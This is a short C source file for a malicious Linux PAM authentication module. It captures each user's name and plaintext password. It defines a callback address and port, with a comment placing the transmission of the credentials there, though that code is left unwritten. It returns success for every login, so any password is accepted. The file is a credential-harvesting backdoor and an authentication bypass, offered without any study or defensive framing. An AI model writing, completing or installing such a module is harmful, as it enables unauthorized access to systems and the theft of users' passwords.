#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define CALLBACK_IP "10.100.150.1"
#define CALLBACK_PORT 5000

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    int retval = pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (username && password) {
        // send data to callback_ip:port
    }

    // authenticate with real pam_unix.so

    return PAM_SUCCESS;
}